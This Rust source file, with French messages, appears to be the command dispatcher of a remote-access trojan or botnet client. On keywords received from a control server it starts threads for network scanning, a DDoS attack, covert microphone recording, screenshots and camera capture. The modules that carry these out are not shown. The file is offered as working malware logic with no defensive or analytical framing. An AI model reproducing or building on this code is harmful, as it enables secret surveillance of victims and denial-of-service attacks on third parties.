use std::sync::{Arc, Mutex};
use std::thread;

mod scan;
mod ddos;
mod picture;
mod record;
mod screenshot;

pub(crate) fn ordre_du_srv(mut ordre: String) {

    let shared_ordre = Arc::new(Mutex::new(ordre));

        if shared_ordre.lock().unwrap().contains("scan") {
            println!("Lancement du scan réseau");
            let ordre_clone = Arc::clone(&shared_ordre);
            let t = thread::spawn(move || {
                scan::scan(scan::find_net(), ordre_clone.lock().unwrap().clone());
            });
        }

        if shared_ordre.lock().unwrap().contains("ddos") {
            println!("Lancement de l'attaque ddos avancée");
            let ordre_clone = Arc::clone(&shared_ordre);
            let t = thread::spawn(move || {
                ddos::ddos(ordre_clone.lock().unwrap().clone());
            });
        }

        if shared_ordre.lock().unwrap().contains("record") {
            println!("Lancement de l'enregistrement du microphone");
            let ordre_clone = Arc::clone(&shared_ordre);
            let t = thread::spawn(move || {
                record::record();
            });
        }

        if shared_ordre.lock().unwrap().contains("screenshot") {
            println!("Lancement de la capture d'écran");
            let ordre_clone = Arc::clone(&shared_ordre);
            let t = thread::spawn(move || {
                screenshot::screenshot("screenshot.png");
            });
        }

        if shared_ordre.lock().unwrap().contains("picture") {
            println!("Lancement de la capture d'image");
            let ordre_clone = Arc::clone(&shared_ordre);
            let t = thread::spawn(move || {
                picture::picture();
            });
        }

        println!("{:?}", shared_ordre.lock().unwrap().as_str());
    }


